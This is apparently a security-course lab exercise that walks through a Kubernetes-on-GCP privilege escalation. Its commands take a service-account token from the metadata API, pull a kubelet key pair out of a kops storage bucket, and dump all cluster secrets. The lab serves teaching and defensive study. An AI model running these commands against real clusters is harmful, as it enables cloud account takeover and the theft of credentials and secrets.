---
layout: exercise
exercise: 90
title: "Exercise: Kubernetes Cloud Attacks"
tools: openssh-client kubectl curl jq
directories_to_sync: ssh-config K8S-Exercise
---

## Steps

In this exercise, you are a bad actor who has phished a developer.  That developer has very limited access on a Kubernetes cluster; they are able to exec into a specific single pod, presumably to debug the program running in it. You are going to escalate privilege in this cluster, by using its access to cloud resources.

1. Start up a fresh lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. 


2. Let's use bash.

    ```shell
    bash
    ```

2. The course proctors will provide you with a cloud cluster ID number (`N`). Store this number in your shell profile in a new variable `CLOUD_ID`, and then read this new variable into your environment now:

    ```shell
    # Replace the "N" in `CLOUD_ID=N` with the ID number provided by the proctors
    echo "export CLOUD_ID=N" >> ~/.bashrc
    source ~/.bashrc
    ```

3. Start by exec-ing into your pod.  We'll give you a JWT, a certificate authority cert and an API server IP address.

    ```shell
    /root/K8S-Exercise/kubectl \
    --server=$(cat /sync/.cloud_clusters/serverip-$CLOUD_ID) \
    --token=$(cat /sync/.cloud_clusters/token-cluster-$CLOUD_ID) \
    --certificate-authority=/sync/.cloud_clusters/ca.crt-$CLOUD_ID \
    exec -it bwa -- /bin/bash
    ```

4. Take a look around:

    ```shell
    kubectl get pods
    ```

5. We're going to be making a ton of requests against the metadata API. Let's make a variable with part of the URL, to shorten the lines we're copying and pasting.

    ```shell
    host="metadata.google.internal"
    ```

6. Since this Kubernetes cluster runs in Google Cloud (GCP), we'll need to get the project ID that this node is running within:

    ```shell
    curl -H "Metadata-Flavor: Google" \
      http://$host/computeMetadata/v1/project/numeric-project-id
    ```

7. This exercise has a number of times like just now, where the output of our command doesn't have a newline, so you're seeing the command output's last line merged with the prompt for your next command.  Let's add a line feed (`\n`) to our command prompt for now:

    ```shell
    export PS1="\n${debian_chroot:+($debian_chroot)}\u@\h:\w\$ "
    ```

8. Now try that previous `curl` command again and see the difference:

    ```shell    
    curl -H "Metadata-Flavor: Google" \
      http://$host/computeMetadata/v1/project/numeric-project-id
    ```

9. You should also be seeing `curl`'s speed statistics.  This is distracting, so we'll add the `-s` flag to some of our `curl` commands to silence that. Let's see things with that effect:

    ```shell
    curl -s -H "Metadata-Flavor: Google" \
      http://$host/computeMetadata/v1/project/numeric-project-id
    ```



10. That URL is still very long. Let's make it shorter by creating a variable for the first part of the URL, including `computeMetadata/v1`:

    ```shell
    url="http://metadata.google.internal/computeMetadata/v1"
    ```

11. Also, let's store the `Metadata-Flavor` header in a variable called `$head`:

    ```shell
    head="Metadata-Flavor: Google"
    ```

12. Test our variables by running the same command as before, but with the variables in play:

    ```shell    
    curl -s -H "${head}" "${url}/project/numeric-project-id"
    ```


13. Now let's store the the numeric-project-id by running that command again, but in a subshell. We assign the ouput to a variable called `project`.

    ```shell
    project=$( curl -s -H "${head}" "${url}/project/numeric-project-id" )
    ```

14. Now let's ask GCP's metadata service for this node's accounts:

    ```shell
    curl -s -H "${head}" "${url}/instance/service-accounts/"
    ```

15. The output contains two service accounts, though one is just an alias for the other. Ask for a listing of data in the `default` service account:

    ```shell
    curl -s -H "${head}" "${url}/instance/service-accounts/default/"
    ```

16. We see there's a kind of directory structure.  Check out the `aliases` item, like so:

    ```shell
    curl -s -H "${head}" "${url}/instance/service-accounts/default/aliases"
    ```

17. Now take a look at that `email` item:

    ```shell

    curl -s -H "${head}" "${url}/instance/service-accounts/default/email"
    ```

18. The valuable thing here is a temporary authentication token - this is a *JSON web token (JWT)*:

    ```shell

    curl -s -H "${head}" "${url}/instance/service-accounts/default/token"
    ```

19. We're getting back `json`, so let's use `jq` to make that easier to understand:

    ```shell

    curl -s -H "${head}" "${url}/instance/service-accounts/default/token"|jq .
    ```

20. Note that there's an `expires` field.  Let's see how it changes when we pull the same token again:

    ```shell

    curl -s -H "${head}" \
    "${url}/instance/service-accounts/default/token" \
    | jq .
    ```

21. Let's parse the `access_token` part out, by telling `jq` that we want `.access_token`.  The `.` serves as the root of the data structure being parsed:

    ```shell

    curl -s -H "${head}" "${url}/instance/service-accounts/default/token" | \
      jq .access_token
    ```

22. Let's assign that to a variable. In the right hand size (RHS) of this command, we're running the command we just used in the previous step:

    ```shell

    token=$( curl -s -H "${head}" "${url}/instance/service-accounts/default/token" | \
      jq .access_token )
    ```

23. View the token:

    ```shell
    echo $token
    ```

24. Now let's use the token to view a list of all Google Cloud Storage (GCS) buckets in this project:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json"\
      https://www.googleapis.com/storage/v1/b/?project=$project
    ```

    **Note:** the URL there is simpler than it looks - we are hitting the `/storage` API, using version `v1`.  And then we're asking for a list of buckets, with `/b/`.

25. We got back a JSON data structure with each bucket in its own sub-structure. Let's parse that out. First, get just the `.items` part of the output:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      https://www.googleapis.com/storage/v1/b/?project=$project | jq .items
    ```

26. This items part is a list/array of dictionaries, with each dictionary corresponding to one bucket.  Let's use `jq` to iterate over each one, getting its `name`:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      https://www.googleapis.com/storage/v1/b/?project=$project | \
      jq -r '.items[] | .name'
    ```

27. So there's one bucket in particular that stands out, as it has `kops` in it, the name of a popular Kubernetes installer.  Let's take a look at that bucket in particular by sending the `items` list through a `select` filter:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      https://www.googleapis.com/storage/v1/b/?project=$project | \
      jq '.items[] | select(.name | contains("bustakube-kops"))'
    ```

28. Now, let's take the resulting structure, which shows only one bucket, and parse the `name` out of it:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      https://www.googleapis.com/storage/v1/b/?project=$project | \
      jq '.items[] | select(.name | contains("bustakube-kops")) | .name'
    ```

29. We want to use this output in a URL, but those quotes around it will get in our way. We'll need to add a `-r` (raw output) flag to `jq`, to get it to remove the quotes:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      https://www.googleapis.com/storage/v1/b/?project=$project | \
      jq -r '.items[] | select(.name | contains("bustakube-kops")) | .name'
    ```

30. Set the variable `bucket` to this bucket name:

    ```shell
    bucket=$(curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      https://www.googleapis.com/storage/v1/b/?project=$project | \
      jq -r '.items[] | select(.name | contains("bustakube-kops")) | .name' )
    ```

31. Now get a list of object in the bucket.  You're going to be taking that bucket listing part of the URL  `/b/`, adding a bucket name, and now saying that you want a list of objects in it, via `/o/`:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      https://www.googleapis.com/storage/v1/b/$bucket/o/?project=$project
    ```

32. The resulting data structure has enough items to make them scroll off the page.  Let's make that data structure easier to follow by just asking for the name of each object:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      https://www.googleapis.com/storage/v1/b/$bucket/o/?project=$project | \
      jq -r '.items[] | .name'
    ```

33. That's still quite a bit of output, but you should be able to see that there's a number of lines (objects) with `/pki/private/` in their name. One of those is a kubelet's key pair:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      https://www.googleapis.com/storage/v1/b/$bucket/o/?project=$project \
      | jq -r '.items[] | .name' | grep private/kubelet/keyset
    ```

34. Let's get that that bucket's `selfLink` - note that we're using `jq`'s `select` instead of `grep` in this line:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
    https://www.googleapis.com/storage/v1/b/$bucket/o/?project=$project | \
    jq -r '.items[] | select( .name | contains ("private/kubelet/keyset") ) | .selfLink'
    ```

35. The `selfLink` has a complete URL reference to the bucket.  Let's put it in a variable called `link`:

    ```shell

    link=$( curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
    https://www.googleapis.com/storage/v1/b/$bucket/o/?project=$project \
    | jq -r '.items[] | select( .name | contains ("private/kubelet/keyset") ) | .selfLink' )
    ```

36. If we append `?alt=media` to the end, we get its contents.  Let's `curl` the link, with the headers we need for authorization:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      "${link}?alt=media"
    ```

37. The JSON we get back contains Base64-encoded versions of a Kubelet client private key and certificate. Let's store those in a file:

    ```shell
    curl -s -H "Authorization: Bearer $token" -H "Accept: json" \
      "${link}?alt=media" >keyset-kubelet.yaml
    ```

38. Let's Base64 decode the "privateMaterial" and store it in a file called `clientkey`:

    ```shell
    cat keyset-kubelet.yaml | grep privateMaterial | \
      awk '{print $2}' | base64 -d >clientkey
    ```

39. Let's Base64 decode the "publicMaterial" and store it in a file called `clientcert`:

    ```shell
    cat keyset-kubelet.yaml | grep publicMaterial \
    | awk '{print $2}' | base64 -d >clientcert
    ```

40. Take a look at those two files:

    ```shell
    cat clientcert clientkey
    ```

41. Exit the bwa pod:

    ```shell
    exit
    ```

42. Create a kubectl command alias to make things easier:

    ```shell
    alias kubectl="/root/K8S-Exercise/kubectl \
    --server=$(cat /sync/.cloud_clusters/serverip-$CLOUD_ID) \
    --token=$(cat /sync/.cloud_clusters/token-cluster-$CLOUD_ID) \
    --certificate-authority=/sync/.cloud_clusters/ca.crt-$CLOUD_ID"
    ```

43. Copy the `/clientkey` file out of the bwa pod:

    ```shell
    kubectl exec bwa -- bash -c "cat /clientkey" >clientkey
    ```

44. Copy the `/clientcert` file out of the bwa pod:

    ```shell
    kubectl exec bwa -- bash -c "cat /clientcert" >clientcert
    ```
   
45. Redo your kubectl alias to use the cloud cluster, but with  `--client-key` and `--client-certificate` command-line options in place of `--token`, so we can use the kubelet key and certificate to authenticate:

    ```shell
    alias kubectl="/root/K8S-Exercise/kubectl \
    --server=$(cat /sync/.cloud_clusters/serverip-$CLOUD_ID) \
    --certificate-authority=/sync/.cloud_clusters/ca.crt-$CLOUD_ID \
    --client-key=clientkey --client-certificate=clientcert "
    ```

46. Let's see what privileges we have:

    ```shell
    kubectl auth can-i --list
    ```

47. Try pulling every secret in the cluster:

    ```shell
    kubectl get secrets --all-namespaces -o yaml
    ```

48. Notice that you have all the service account tokens!

